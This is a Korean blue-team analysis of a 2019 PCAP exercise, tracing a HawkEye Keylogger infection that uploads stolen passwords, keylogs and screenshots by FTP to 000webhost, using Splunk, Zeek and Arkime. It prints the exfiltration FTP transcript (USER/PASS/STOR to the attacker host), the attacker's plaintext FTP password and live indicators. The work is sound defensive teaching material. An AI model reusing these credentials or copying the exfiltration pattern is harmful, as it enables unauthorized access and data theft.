---
title: BEGUILESOFT — Splunk 중심 베이스라이닝에서 FTP로 비밀번호·키로그·스크린샷을 훔쳐 가는 HawkEye Keylogger까지
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - snort
  - ftp
  - exfiltration
  - ticket
---

# BEGUILESOFT — HawkEye Keylogger: FTP로 빠져나간 비밀번호, 키로그, 스크린샷 { #beguilesoft }

!!! abstract "사례 요약"
    malware-traffic-analysis.net 2019-05-02 "BEGUILESOFT" PCAP을 홈 랩의 **pcapbox** VM에서 **Splunk 중심**으로 분석하고, 패킷 내용이 필요할 때만 Arkime를 쓴 기록입니다. AD 도메인의 윈도우 7 PC 한 대(**Breaux-Win7-PC, 사용자 adriana.breaux**)가 자기 공인 IP를 확인한 다음, 무료 호스팅 서비스 `files.000webhost[.]com`에 **FTP** 계정 **`snifferzett`**으로 로그인합니다. 그리고 10~15분 간격으로 세 번 접속해 파일 5개를 올려요. **Gmail, BB&T 온라인뱅킹, Outlook 메일**의 저장된 비밀번호가 든 **"Stealer Records"** 파일, **키로그** 2개(Excel에 입력한 지급 데이터), **스크린샷** 2개로 모두 약 **5 MB**예요. 파일 이름에 **HawkEye Keylogger**라고 적혀 있어요. 마지막에 아주 간단한 Snort 룰 하나와 짧은 티켓으로 마무리합니다.

| | |
|---|---|
| **증거** | `2019-05-02-traffic-analysis-exercise.pcap` — 2019-05-02 21:35:18 – 22:05:23 UTC (약 30분) |
| **출처** | [malware-traffic-analysis.net 2019-05-02 "BEGUILESOFT"](https://malware-traffic-analysis.net/2019/05/02/index.html) |
| **환경** | 폐쇄망. pcapbox VM: Splunk(`index=zeek`, 케이스 필드 `pcap_case`), Arkime(태그 = 케이스 이름), Snort 2.9.20. **Wireshark 사용 안 함.** |
| **결과물** | 분석, Snort 룰 하나, 짧은 침해사고 티켓(txt) |
| **관련 페이지** | [Night Dew 두 번째 분석(pcapbox 설정, Snort 테스트 가이드)](night-dew-arkime-splunk-netlogon-bruteforce.md) · [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [Zeek 로그](../../network/zeek/index.md) · [플레이북: 데이터 유출](../playbooks/data-exfiltration.md) |

!!! tip "이 페이지 읽는 법"
    실제로 분석한 순서 그대로예요. **베이스라이닝 → 수상한 목적지 → FTP 상세 → Arkime로 내용 확인 → Snort → 티켓**. SPL 쿼리는 모두 한 줄씩 설명하고, 결과가 어떻게 나왔는지와 어떻게 읽는지를 붙였어요. **질문** 상자는 분석하면서 실제로 나온 질문과 답이에요.

!!! warning "이 페이지의 지표는 실제 값입니다"
    도메인, IP, 계정 이름은 2019년 실제 악성 트래픽에서 나온 값입니다. 본문과 표에서는 무력화(`[.]`)했고, 코드 블록 안은 입력한 그대로 두었어요. **절대 접속하지 마세요.** 피해자의 실제 비밀번호는 이 페이지에 싣지 않았어요.

## 한눈에 보는 답 { #answers }

| 항목 | 답 | 상태 |
|---|---|---|
| 감염 PC | **10.0.0.227, Breaux-Win7-PC**, MAC `84:8f:69:09:86:c0` (Dell) | 확인 |
| 사용자 | **adriana.breaux** (도메인 BEGUILESOFT) | 확인 |
| DC | 10.0.0.10, beguilesoft-dc.beguilesoft[.]com | 확인 |
| 첫 악성 이벤트 | **21:36:14 UTC** 공인 IP 조회(`whatismyipaddress[.]com`), 이어서 **21:36:33** 첫 FTP 로그인 | 확인 |
| 유출 목적지 | `files.000webhost[.]com` — 145.14.145.4, 145.14.144.10, 145.14.145.99 (이름 하나, IP 셋) | 확인 |
| FTP 계정 | `snifferzett` (공격자 계정, 세 세션 모두 같음) | 확인 |
| 훔친 데이터 | 파일 5개, 약 5.06 MB: Stealer Records(Gmail, BB&T 은행, Outlook POP3 — **세 계정이 비밀번호 하나를 같이 씀**), 키로그 2개(Excel 지급 데이터, Word 입력), 스크린샷 2개 | 확인 |
| 업로드 결과 | STOR 5번 모두 `226 File successfully transferred` | 확인 |
| 초기 침투 | 캡처에 없음 — PC가 이미 감염된 상태 | 추정 |
| 악성코드 계열 | HawkEye Keylogger — 샘플이 아니라 **업로드된 파일 이름**에서 판단 | 추정(강함) |

---

## 0단계 — 첫 쿼리 전에 { #prep }

PCAP을 **`20190502_BEGUILESOFT.pcap`**이라는 이름으로 `\\10.50.10.60\incoming`에 넣었어요. 그래서 케이스 이름은 `20190502_BEGUILESOFT`예요(Splunk 필드 `pcap_case`, Arkime 태그). 쿼리 전에 두 가지를 확인해요.

1. **Splunk 시간 범위 = All time.** pcapbox에서는 `_time`이 패킷 시간(2019년)이라서, 기본값 "Last 24 hours"로 두면 결과가 하나도 안 나와요.
2. **Splunk 계정 시간대 = UTC** (계정 메뉴 → Preferences). `strftime`은 Splunk 계정 시간대로 출력하기 때문이에요.

설치와 넣는 방법은 [Night Dew 두 번째 분석 — 0단계](night-dew-arkime-splunk-netlogon-bruteforce.md#prep)에 있어요.

---

## 1단계 — 베이스라이닝 { #baseline }

**목적:** 나쁜 것을 찾기 전에 기본부터 알아 둬요. 캡처가 **언제** 시작하고 끝나는지, **어떤 로그**가 있는지, **어떤 내부 PC**가 통신하는지, 그리고 **호스트명, MAC, DC, 사용자**예요. 호스트 정보 말고는 티켓에 넣지 않아요.

### 1-1. 캡처 시간과 로그 종류 { #log-types }

```spl
index=zeek pcap_case="20190502_BEGUILESOFT"
| stats count AS events min(ts) AS first max(ts) AS last BY sourcetype
| eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S")
| sort - events
```

- **1줄**은 이 케이스의 Zeek 이벤트를 모두 가져와요. `pcap_case`는 pcapbox가 PCAP 파일 이름을 넣어 둔 필드예요.
- **2줄** `stats`는 엑셀의 피벗처럼 "묶어서 계산"하는 명령이에요. `BY sourcetype`은 로그 종류(conn, dns, http…)별로 묶으라는 뜻이고, 묶음마다 `count`(개수), `min(ts)`(가장 이른 시간), `max(ts)`(가장 늦은 시간)를 구해요. `AS`는 결과 칼럼 이름을 정해요.
- **3줄** `eval`은 새 값을 계산하거나 덮어써요. `ts`는 1556832918 같은 epoch 숫자라서, `strftime`으로 사람이 읽을 수 있는 날짜로 바꿔요.
- **4줄** `sort - events`는 개수가 많은 순서로 정렬해요. `-`가 내림차순이에요.

결과(이벤트 281개, 로그 종류 15개):

```text
sourcetype          events  first                last
zeek:conn           99      2019-05-02 21:35:18  2019-05-02 22:05:23
zeek:dns            49      2019-05-02 21:35:18  2019-05-02 22:01:33
zeek:kerberos       39      2019-05-02 21:35:18  2019-05-02 22:05:23
zeek:ldap_search    23      2019-05-02 21:35:18  2019-05-02 21:36:13
zeek:dce_rpc        15      2019-05-02 21:35:18  2019-05-02 21:36:57
zeek:ldap           15      2019-05-02 21:35:18  2019-05-02 21:36:13
zeek:ftp            10      2019-05-02 21:36:35  2019-05-02 22:01:34
zeek:files          9       2019-05-02 21:35:24  2019-05-02 22:01:35
zeek:smb_mapping    9       2019-05-02 21:35:18  2019-05-02 22:05:23
zeek:ntp            4       2019-05-02 21:35:23  2019-05-02 21:52:27
zeek:weird          3       2019-05-02 21:35:18  2019-05-02 21:36:57
zeek:http           2       2019-05-02 21:35:26  2019-05-02 21:36:14
zeek:smb_files      2       2019-05-02 21:35:24  2019-05-02 21:36:13
zeek:dhcp           1       2019-05-02 21:35:21  2019-05-02 21:35:21
zeek:software       1       2019-05-02 21:35:26  2019-05-02 21:35:26
```

**결과 읽기:**

- `zeek:conn`의 first~last가 캡처 시간이에요. **21:35:18 – 22:05:23 UTC, 약 30분**이에요.
- kerberos, ldap, dce_rpc, smb는 정상적인 **윈도우 도메인** 트래픽이에요.
- **`zeek:ftp`가 10건(21:36:35 – 22:01:34)** 있고, **`zeek:ssl`은 아예 없고**, HTTP는 2건뿐이에요. 일반 사무실 PC가 FTP를 쓰는 일은 드물어요. 그런데 정보 탈취형 악성코드(인포스틸러)는 훔친 데이터를 FTP로 보내는 경우가 많아요. 아직 결론은 아니지만, 베이스라이닝 다음에 가장 먼저 볼 곳이에요.

### 1-2. DHCP — 호스트명, MAC, 도메인 { #dhcp }

```spl
index=zeek sourcetype=zeek:dhcp pcap_case="20190502_BEGUILESOFT"
| eval time=strftime(ts, "%Y-%m-%d %H:%M:%S")
| table time assigned_addr mac host_name domain msg_types
```

- `sourcetype=zeek:dhcp`는 DHCP 로그만 가져와요.
- `table`은 원하는 칼럼만 원하는 순서로 보여 줘요.
- `assigned_addr`는 DHCP 서버가 준 IP, `mac`은 PC의 MAC, `host_name`은 PC가 스스로 알린 이름(티켓의 HOSTNAME), `domain`은 DHCP가 알려 준 도메인 이름, `msg_types`는 DHCP 메시지 종류예요.

```text
time                 assigned_addr  mac                host_name       domain           msg_types
2019-05-02 21:35:21                 84:8f:69:09:86:c0  Breaux-Win7-PC  beguilesoft.com  INFORM ACK
```

!!! note "`assigned_addr`가 왜 비어 있나요?"
    `msg_types`가 REQUEST가 아니라 **INFORM**이에요. INFORM은 IP를 이미 가진 PC(고정 IP나 예전에 받은 주소)가 도메인 이름 같은 **설정만** 물어보는 메시지예요. 새로 "배정된" IP가 없으니 칸이 비어요. IP는 다음 쿼리에서 나와요(10.0.0.227). `table`에 `client_addr`를 추가하면 PC가 요청할 때 쓴 IP도 볼 수 있어요.

### 1-3. 어떤 내부 IP가 통신을 시작하나 { #internal-hosts }

```spl
index=zeek sourcetype=zeek:conn pcap_case="20190502_BEGUILESOFT"
| where cidrmatch("10.0.0.0/8", id_orig_h) OR cidrmatch("172.16.0.0/12", id_orig_h) OR cidrmatch("192.168.0.0/16", id_orig_h)
| stats count AS conns dc(id_resp_h) AS dests BY id_orig_h
| sort - conns
```

- `id_orig_h`는 연결을 **시작한** 쪽 IP예요.
- `where`는 조건이 참인 이벤트만 남기는 필터예요. `cidrmatch("10.0.0.0/8", id_orig_h)`는 "이 IP가 10.0.0.0/8 대역 안에 있는가?"를 묻는 함수예요. 사설 대역 3개를 `OR`로 이어서 **내부** IP만 남겨요.
- `count`는 연결 수, `dc(id_resp_h)`는 "distinct count", 즉 서로 다른 목적지 IP 수예요. `BY id_orig_h`라서 내부 IP 하나당 한 줄이 나와요.

```text
id_orig_h    conns  dests
10.0.0.227   99     10
```

**통신을 시작하는 내부 PC는 하나뿐**이고, 목적지도 10개뿐이에요. 분석 대상은 10.0.0.227이에요.

### 1-4. Kerberos — DC와 사용자 계정 { #kerberos }

```spl
index=zeek sourcetype=zeek:kerberos pcap_case="20190502_BEGUILESOFT"
| stats count BY id_orig_h id_resp_h client
```

Kerberos(포트 88)는 윈도우 도메인 로그인 인증이에요. 이 로그 하나로 세 가지를 알 수 있어요. `id_resp_h`는 요청을 받은 서버, 즉 **DC**이고, `client`는 `사용자명/도메인` 형태의 **로그인한 계정**이에요.

```text
id_orig_h    id_resp_h   client                            count
10.0.0.227   10.0.0.10   /BEGUILESOFT.COM                  15
10.0.0.227   10.0.0.10   BREAUX-WIN7-PC$/BEGUILESOFT.COM   12
10.0.0.227   10.0.0.10   adriana.breaux/BEGUILESOFT        2
10.0.0.227   10.0.0.10   adriana.breaux/BEGUILESOFT.COM    5
10.0.0.227   10.0.0.10   breaux-win7-pc$/BEGUILESOFT.COM   2
10.0.0.227   10.0.0.10   breaux-win7-pc$/beguilesoft.com   2
```

**결과 읽기:**

- **DC = 10.0.0.10**이에요.
- **`$`로 끝나는 이름**은 사람이 아니라 **컴퓨터 계정**이에요(PC 자신의 로그인). 호스트명을 확인해 주는 정도예요.
- **이름 없이 `/BEGUILESOFT.COM`만 있는 15건**은 **TGS 요청**(서비스 티켓 요청)이에요. TGS 요청에는 사용자 이름이 읽을 수 있는 형태로 들어 있지 않아서 Zeek이 비워 둬요.
- 남는 것이 **사용자 adriana.breaux**예요.

`zeek:kerberos`가 없으면 `sourcetype=zeek:ntlm`으로 바꾸고 `BY id_orig_h username hostname domainname`으로 보세요.

**베이스라인 요약:** 캡처 21:35:18 – 22:05:23 UTC · PC 한 대 **10.0.0.227 Breaux-Win7-PC**, MAC 84:8f:69:09:86:c0 · 도메인 beguilesoft.com · DC 10.0.0.10 · 사용자 **adriana.breaux**. 그리고 FTP가 수상해요.

---

## 2단계 — 모든 목적지를 시간 순서로 { #destinations }

목적지가 10개뿐이라 전부 봐요.

```spl
index=zeek sourcetype=zeek:conn pcap_case="20190502_BEGUILESOFT"
| stats count AS conns sum(orig_bytes) AS sent sum(resp_bytes) AS recv min(ts) AS first BY id_resp_h id_resp_p service
| eval first=strftime(first, "%H:%M:%S")
| sort first
```

- `sum()`은 묶음 안의 값을 모두 더해요. `orig_bytes`는 PC가 **보낸** 바이트, `resp_bytes`는 **받은** 바이트예요. 보낸 양이 받은 양보다 크면 **데이터 유출**(exfil)을 의심해요.
- `BY id_resp_h id_resp_p service`는 목적지 IP + 포트 + Zeek이 알아낸 프로토콜(dns, http, ftp…) 조합마다 한 줄씩 만들어요.
- `sort first`는 `-`가 없으니 **오름차순**이에요. 처음 연락한 순서대로 보여 줘서 타임라인처럼 읽을 수 있어요.

```text
id_resp_h        id_resp_p  service             conns  sent      recv    first
10.0.0.10        135        dce_rpc             1      496       548     21:35:18
10.0.0.10        389        ldap_tcp,krb,gssapi 4      11310     14015   21:35:18
10.0.0.10        445        gssapi,smb,krb      5      20962     7212    21:35:18
10.0.0.10        53         dns                 21     1307      2354    21:35:18
10.0.0.10        88         krb_tcp             24     28669     31383   21:35:18
...              (DC, 브로드캐스트, LLMNR, DHCP, NTP 줄 더 있음)
204.2.193.137    80         http                1      97        179     21:35:26
104.16.154.36    80         http                1      71        564     21:36:14
145.14.145.4     21         ftp                 1      152       540     21:36:33
145.14.145.4     37280      ftp-data            1      2791      0       21:36:35
145.14.144.10    21         ftp                 1      205       747     21:46:27
145.14.144.10    40651      ftp-data            1      891       0       21:46:27
145.14.144.10    47434      ftp-data            1      2832685   0       21:46:28
145.14.145.99    21         ftp                 1      206       746     22:01:33
145.14.145.99    35396      ftp-data            1      2225681   0       22:01:34
145.14.145.99    36091      ftp-data            1      601       0       22:01:34
```

**결과 읽기:**

- 21:35에 10.0.0.10으로 가는 것은 모두 도메인 로그인이에요. DNS, Kerberos, LDAP, SMB, RPC로 정상이에요.
- 외부는 **세 무리**뿐이에요. 204.2.193.137(윈도우 인터넷 연결 확인), 21:36:14의 104.16.154.36, 그리고 **FTP로 접속한 145.14.x IP 세 개**예요.
- **`ftp`와 `ftp-data`가 짝으로 나와요.** 포트 21은 수백 바이트뿐인데, 높은 포트의 `ftp-data`는 최대 2.8 MB를 보냈고 **받은 건 0바이트**예요. 업로드의 전형적인 모양이에요.
- FTP 접속은 **21:36, 21:46, 22:01** 세 번이에요(10분, 15분 간격).

### 2-1. DNS — 그 IP 뒤에 있는 이름 { #dns }

```spl
index=zeek sourcetype=zeek:dns pcap_case="20190502_BEGUILESOFT"
| stats count values(answers) AS answers min(ts) AS first BY query
| eval first=strftime(first, "%H:%M:%S")
| sort first
```

- `query`는 PC가 물어본 도메인 이름이에요.
- `values(answers)`는 그 이름의 응답을 **중복 없이 모두** 한 칸에 모아요. 그래서 "이름 → IP"를 conn 결과와 맞춰 볼 수 있어요.

중요한 줄만 추렸어요(`_ldap._tcp...`, `WPAD`, `isatap` 같은 건 정상적인 윈도우 잡음이에요):

```text
query                              count  answers                                              first
beguilesoft-dc.beguilesoft.com     2      10.0.0.10                                            21:35:18
breaux-win7-pc.beguilesoft.com     2      add: A breaux-win7-pc.beguilesoft.com 10.0.0.227 ... 21:35:26
www.msftncsi.com                   1      204.2.193.137 204.2.193.138 a1961.g2.akamai.net ...   21:35:26
whatismyipaddress.com              1      104.16.154.36 104.16.155.36                          21:36:14
files.000webhost.com               8      145.14.144.10 145.14.145.4 145.14.145.99 us-east-1.route-1000.000webhost.awex.io  21:36:33
dns.msftncsi.com                   2      131.107.255.255 fd3e:4f5a:5b81::1                    21:41:28
```

**결과 읽기:**

- `breaux-win7-pc.beguilesoft.com`의 `add: A ... 10.0.0.227`은 PC가 **자기 DNS 이름을 등록**한 거예요. IP와 호스트명을 한 번 더 확인해 줘요.
- `www.msftncsi.com` / `dns.msftncsi.com`은 윈도우의 "인터넷 되나?" 확인이에요. 정상이에요.
- **21:36:14 `whatismyipaddress[.]com`**은 "내 공인 IP가 뭐지?"를 알려 주는 서비스예요. 사람은 잘 안 들어가지만, 악성코드는 자기가 어디서 돌고 있는지 알려고 써요. HawkEye가 이 조회를 하는 것으로 알려져 있어요.
- **21:36:33 `files.000webhost[.]com`**을 8번 물었고 답은 **IP 세 개**예요. 바로 그 FTP 서버 세 개예요. 000webhost는 **무료 호스팅** 서비스라서, 공격자가 훔친 데이터를 싸고 익명으로 받기 좋아요.

---

## 3단계 — FTP로 무엇이 나갔나 { #ftp }

```spl
index=zeek sourcetype=zeek:ftp pcap_case="20190502_BEGUILESOFT"
| eval time=strftime(ts, "%H:%M:%S")
| table time id_resp_h user command arg reply_code reply_msg
```

`zeek:ftp`는 **FTP 명령 하나당 한 줄**이에요. `user`는 로그인 계정, `command`는 FTP 명령(**STOR**는 서버로 업로드, **RETR**는 다운로드), `arg`는 명령의 인자(STOR라면 파일 이름), `reply_code`는 서버 응답 코드(226이면 전송 완료)예요.

```text
time      id_resp_h      user         command  arg                                                                          reply_code  reply_msg
21:36:35  145.14.145.4   snifferzett  PASV                                                                                 227         Entering Passive Mode (145,14,145,4,145,160).
21:36:35  145.14.145.4   snifferzett  STOR     ftp://145.14.145.4/HawkEye_Keylogger_Stealer_Records_BREAUX-WIN7-PC 5.2.2019 9:36:28 PM.txt  421  Idle timeout (30 seconds): closing control connection
21:46:27  145.14.144.10  snifferzett  PASV                                                                                 227         Entering Passive Mode (145,14,144,10,158,203).
21:46:28  145.14.144.10  snifferzett  STOR     ftp://145.14.144.10/HawkEye_Keylogger_Keylog_Records_2_BREAUX-WIN7-PC 5.2.2019 9:46:22 PM.txt  226  0.068 seconds (measured here), 12.72 Kbytes per second
21:46:28  145.14.144.10  snifferzett  PASV                                                                                 227         Entering Passive Mode (145,14,144,10,185,74).
21:46:28  145.14.144.10  snifferzett  STOR     ftp://145.14.144.10/screenshot1_BREAUX-WIN7-PC.jpeg                         421         Idle timeout (30 seconds): closing control connection
22:01:34  145.14.145.99  snifferzett  PASV                                                                                 227         Entering Passive Mode (145,14,145,99,138,68).
22:01:34  145.14.145.99  snifferzett  STOR     ftp://145.14.145.99/HawkEye_Keylogger_Keylog_Records_3_BREAUX-WIN7-PC 5.2.2019 10:01:28 PM.txt  226  0.064 seconds (measured here), 9.12 Kbytes per second
22:01:34  145.14.145.99  snifferzett  PASV                                                                                 227         Entering Passive Mode (145,14,145,99,140,251).
22:01:34  145.14.145.99  snifferzett  STOR     ftp://145.14.145.99/screenshot2_BREAUX-WIN7-PC.jpeg                         421         Idle timeout (30 seconds): closing control connection
```

**결과 읽기:**

1. **파일 이름이 악성코드를 알려 줘요.** `HawkEye_Keylogger_Stealer_Records_...`, `HawkEye_Keylogger_Keylog_Records_2/3_...`, `screenshot1/2_...`. HawkEye는 잘 알려진 정보 탈취형 악성코드(키로거)예요.
2. **첫 업로드가 "Stealer Records"**예요. 브라우저와 메일 프로그램에 저장된 비밀번호를 훔친 기록이에요. 그다음 두 번은 **키로그**(키 입력)와 **스크린샷**을 하나씩 올렸어요.
3. **계정은 매번 `snifferzett`**이고, 000webhost IP만 세 번 다 달라요.
4. 파일 이름의 시간(9:36:28 PM, 9:46:22 PM, 10:01:28 PM)이 캡처의 UTC 시간과 같아요. **PC 시계가 UTC로 맞춰져 있어요.**
5. 왜 **USER/PASS** 줄이 따로 없을까요? Zeek ftp.log는 모든 명령을 기록하지 않아요. 기본 설정(`FTP::logged_commands`)으로는 파일 전송과 관련된 명령(STOR, RETR, APPE, DELE, PASV, PORT, EPSV, EPRT 등)만 한 줄씩 남기고, **로그인 정보는 그 줄의 `user`, `password` 칸에** 붙여 넣어요. 비밀번호는 기본으로 `<hidden>`이라서, 실제 값은 Arkime에서 봐요([4단계](#arkime)).

### 3-1. 파일과 크기 짝짓기 (PASV 포트 계산) { #pasv-math }

`zeek:ftp`에는 파일 크기가 없어요. 크기는 `conn`의 `ftp-data` 줄에 있어요. **PASV 응답**으로 짝을 지어요. `(h1,h2,h3,h4,p1,p2)`에서 앞의 4개가 IP이고, 데이터 포트는 **p1 × 256 + p2**예요.

```text
(145,14,145,4,145,160)   → 145×256+160 = 37280 → 2,791 B     Stealer_Records
(145,14,144,10,158,203)  → 158×256+203 = 40651 → 891 B       Keylog_Records_2
(145,14,144,10,185,74)   → 185×256+74  = 47434 → 2,832,685 B screenshot1
(145,14,145,99,138,68)   → 138×256+68  = 35396 → 2,225,681 B screenshot2
(145,14,145,99,140,251)  → 140×256+251 = 36091 → 601 B       Keylog_Records_3
```

데이터 연결로 보낸 합계는 **5,062,649 B ≈ 5.06 MB**이고 받은 건 0이에요. 한 번 더 확인할 수도 있어요. Keylog_Records_3의 226 응답은 0.064초에 9.12 KB/s라서 약 584 B인데, 실제 전송량 601 B와 거의 같아요.

!!! question "질문: FTP 명령어들을 좀 더 설명해 주세요"
    **FTP는 연결을 두 개 써요.** **제어 연결**(포트 21)로는 "로그인할게", "이 파일 올릴게" 같은 명령과 응답만 오가요. 파일 내용은 **데이터 연결**로 따로 가요. 그래서 conn 결과에 `ftp`(포트 21, 수백 바이트)와 `ftp-data`(높은 포트, 수 MB)가 나란히 나와요. 분석할 때는 제어 연결에서 "무슨 파일을 어디로"를 보고, 데이터 연결에서 "얼마나, 무슨 내용"을 봐요.

    이 PCAP의 업로드 하나를 Arkime로 보면 이래요(`C:` = 감염 PC, `S:` = 서버):

    ```text
    S: 220 ProFTPD Server (000webhost.com) [::ffff:145.14.144.10]   ← 서버 인사
    C: USER snifferzett                         ← 계정 이름
    S: 331 User snifferzett OK. Password required
    C: PASS ********                            ← 비밀번호 (평문!)
    S: 230 OK. Current restricted directory is /
    C: OPTS utf8 on                             ← 파일 이름을 UTF-8로
    S: 200 OK, UTF-8 enabled
    C: PWD                                      ← 지금 어느 폴더?
    S: 257 "/" is your current location
    C: CWD /                                    ← 최상위 폴더로 이동
    S: 250 OK. Current directory is /
    C: TYPE I                                   ← 바이너리 모드
    S: 200 TYPE is now 8-bit binary
    C: PASV                                     ← 데이터용 포트 열어 줘
    S: 227 Entering Passive Mode (145,14,144,10,158,203).
    C: STOR HawkEye_Keylogger_Keylog_Records_2_BREAUX-WIN7-PC 5.2.2019 9:46:22 PM.txt
    S: 150 Connecting to port 44294             ← 데이터 연결로 보내라
       [데이터 연결 10.0.0.227 → 145.14.144.10:40651 으로 891 B]
    S: 226-File successfully transferred        ← 받기 완료
    C: TYPE I / PASV / STOR screenshot1_BREAUX-WIN7-PC.jpeg
       [데이터 연결 → :47434 으로 2,832,685 B]
    S: 226-File successfully transferred
    S: 421 Idle timeout (30 seconds): closing control connection
    ```

    **명령 하나씩 보기:**

    - **USER / PASS**는 로그인 아이디와 비밀번호예요. FTP는 암호화가 없어서 **비밀번호가 평문으로** 네트워크를 지나가요. 공격자가 악성코드 안에 FTP 계정을 박아 두기 때문에, 그 계정이 그대로 노출돼요. 좋은 IOC예요.
    - **OPTS utf8 on / PWD / CWD /**는 파일 이름을 UTF-8로 쓰겠다는 설정, 현재 폴더 묻기, 최상위 폴더로 이동이에요. 정상 FTP 클라이언트 라이브러리가 자동으로 보내는 명령이에요.
    - **TYPE**은 전송 방식이에요. `TYPE A`는 텍스트(ASCII), `TYPE I`는 바이너리(Image)예요. jpeg 같은 파일은 보통 `TYPE I`로 보내요.
    - **PASV**는 "Passive 모드로 할게, 서버가 포트를 열어 줘"라는 뜻이에요. 응답 `227 (h1,h2,h3,h4,p1,p2)`에서 IP와 포트(p1×256+p2)를 알 수 있어요.
    - **STOR**은 **업로드**예요. 클라이언트가 서버에 파일을 저장(store)해요. 내부 PC가 외부로 STOR를 했다면 바로 **데이터 유출**을 의심해요. 이 케이스의 핵심 명령이에요.
    - **QUIT**는 접속 종료예요. 이번에는 클라이언트가 QUIT하기 전에 서버가 421로 먼저 끊었어요.

    **자주 보는 다른 명령들:**

    | 명령 | 뜻 | 분석 포인트 |
    |---|---|---|
    | RETR | 다운로드 (서버 → 클라이언트) | 외부에서 악성 파일을 받아 올 때 |
    | APPE | 기존 파일 뒤에 이어 붙이기 | STOR처럼 유출에 쓰일 수 있음 |
    | PORT / EPRT | Active 모드 (서버가 클라이언트로 접속해 옴) | NAT·방화벽 때문에 요즘은 드묾 |
    | EPSV | PASV의 확장판 (IPv6 지원, 포트만 알려 줌) | `229 (\|\|\|포트\|)` 형태 |
    | LIST / NLST | 폴더 목록 보기 | 정찰 |
    | CWD / MKD / DELE | 폴더 이동, 폴더 생성, 파일 삭제 | 흔적 지우기에 DELE |
    | SYST / FEAT | 서버 종류, 지원 기능 묻기 | 정상 클라이언트도 씀 |

    **악성코드가 거의 항상 PASV를 쓰는 이유:** 감염 PC는 보통 NAT 뒤에 있어서 밖에서 안으로 접속할 수 없어요. Passive 모드는 클라이언트가 **밖으로** 나가서 연결하니까 늘 성공해요.

    **응답 코드는 첫 자리만 알아도 돼요:** 1xx 진행 중(150 데이터 연결 연다), 2xx 성공(220 인사, 227 Passive 모드, 230 로그인 OK, 226 전송 완료), 3xx 추가 정보 필요(331 비밀번호 달라), 4xx 일시적 실패(421 서비스 종료), 5xx 영구 실패(530 로그인 실패, 550 파일 없음/권한 없음).

!!! question "질문: PASV와 STOR이 뭔가요?"
    FTP 서버를 **택배 회사 창고**라고 생각해 보세요. 감염된 PC가 창고에 물건(훔친 파일)을 맡기러 가는 상황이에요.

    FTP에서는 말(명령)을 주고받는 **창구**와 물건(파일)을 넣는 **문**이 따로 있어요. 창구는 항상 같은 곳(포트 21)이지만, 물건 넣는 문은 그때그때 새로 열어요. 그래서 PC가 먼저 이렇게 말해요.

    ```text
    PC:     PASV
    서버:   227 Entering Passive Mode (145,14,144,10,158,203)
    ```

    PC가 "물건 넣을 문 하나 열어 주세요"라고 하면, 서버가 "145.14.144.10의 40651번 문을 열었어요, 거기로 오세요"라고 답하는 거예요. 앞의 숫자 네 개가 IP이고, 문 번호는 `158 × 256 + 203 = 40651`이에요. **Passive**(수동)는 서버는 문만 열고 가만히 기다리고, PC가 그 문으로 찾아간다는 뜻이에요.

    문이 열리면 PC가 어떤 파일을 맡길지 말해요.

    ```text
    PC:     STOR HawkEye_Keylogger_Keylog_Records_2_BREAUX-WIN7-PC ... .txt
    서버:   150 ...                           ← "네, 그 문으로 넣으세요"
            [PC가 40651번 문으로 파일 내용 891바이트를 보냄]
    서버:   226 File successfully transferred  ← "잘 받았어요"
    ```

    **STOR**는 **Store**(저장하다)의 줄임말이에요. 내 PC에서 서버로 파일을 **올리는(업로드)** 명령이에요. 반대로 **내려받는(다운로드)** 명령은 **RETR**(Retrieve, 가져오다)예요.

    파일 하나를 올릴 때마다 항상 **PASV → STOR**가 짝으로 나와요. 문을 열고 파일을 넣고, 다음 파일이 있으면 또 문을 열고 넣어요. 그래서 zeek:ftp 결과에 PASV와 STOR가 번갈아 나왔던 거예요. 기억할 것은 하나예요. **내부 PC가 외부 서버로 STOR를 했다 = 우리 쪽 파일이 밖으로 나갔다.** 이번에는 STOR가 5번이니까 파일 5개가 나간 거예요.

---

## 4단계 — Arkime로 내용 보기 { #arkime }

Splunk는 모양을 보여 주고, 패킷 내용(비밀번호, 파일 내용)은 Arkime에서 봐요. FTP는 암호화가 없어서 다 읽혀요.

```text
tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && port.dst == 21
tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && (ip.dst == 145.14.145.4 || ip.dst == 145.14.144.10 || ip.dst == 145.14.145.99)
tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && port.dst == 37280
tags == 20190502_BEGUILESOFT && ip.src == 10.0.0.227 && http.host == whatismyipaddress.com
```

1. FTP 제어 세션 → 세션 3개(로그인과 STOR 명령).
2. 000webhost로 간 모든 트래픽 → 세션 8개(제어 3 + 데이터 5).
3. **Stealer Records**가 지나간 데이터 연결.
4. 공인 IP 확인 요청.

`tags == <케이스>`는 pcapbox에서 이 케이스 세션만 보게 해요. 실제 망에서는 빼요.

### 4-1. FTP 로그인 { #ftp-login }

포트 21 세션 세 개 중 아무거나 펼쳐서 패킷 화면을 보세요. 세 개 모두 **같은 로그인**이에요.

```text
220 ProFTPD Server (000webhost.com) [::ffff:145.14.145.4]
USER snifferzett
331 User snifferzett OK. Password required
PASS trible22
230-Your bandwidth usage is restricted
230 OK. Current restricted directory is /
```

공격자의 FTP 비밀번호가 평문으로 보여요. IOC로 기록해요(공격자 계정을 알려 주는 값이고, 피해자의 비밀번호가 아니에요).

!!! warning "바로잡기: 421은 업로드 실패가 아니었어요"
    Splunk에서는 Stealer Records와 스크린샷 두 개가 226 대신 **421 Idle timeout**을 받은 것처럼 보여서, "다 저장됐는지 확실하지 않다"고 봤어요. 그런데 Arkime 원본을 보면 **STOR 5번 모두 `226-File successfully transferred`**를 받았어요. 421은 마지막 업로드가 끝난 뒤 30초 동안 아무 명령이 없어서 서버가 연결을 끊은 거예요. Zeek은 명령마다 **마지막** 응답을 붙이는데, 마지막 STOR 뒤에 온 421이 그 STOR에 붙어서 실패처럼 보였던 거예요. **5개 파일 모두 서버에 저장됐어요.** Zeek 요약만 보고 판단하면 안 되고, 원본을 직접 봐야 한다는 좋은 예예요.

    150 응답의 `150 Connecting to port 38174`처럼 포트 번호가 PASV 계산값(37280)과 다른 건 신경 쓰지 않아도 돼요. 000webhost 내부 구조 때문에 나오는 숫자이고, 실제 데이터 포트는 227 응답으로 계산한 값이 맞아요. Arkime 세션 목록에서도 그렇게 보여요.

